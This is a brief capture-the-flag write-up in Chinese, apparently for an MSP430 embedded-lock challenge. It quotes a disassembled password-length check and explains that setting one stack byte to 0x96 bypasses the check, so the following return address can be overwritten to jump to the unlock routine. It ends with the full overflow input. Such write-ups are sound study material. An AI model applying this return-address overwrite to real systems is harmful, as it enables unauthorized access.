```
4578:  f190 9600 1100 cmp.b	#0x96, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>

上面這四行說明 password 的長度是否超過是由 0x11(sp) == 0x96 決定
因此，只要讓 0x11(sp) 的值為 0x96 後面亂塞也沒問題
而該位址的下一個位址即為 return address
將該位址寫入 unlock door 即可破關

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa964644

```
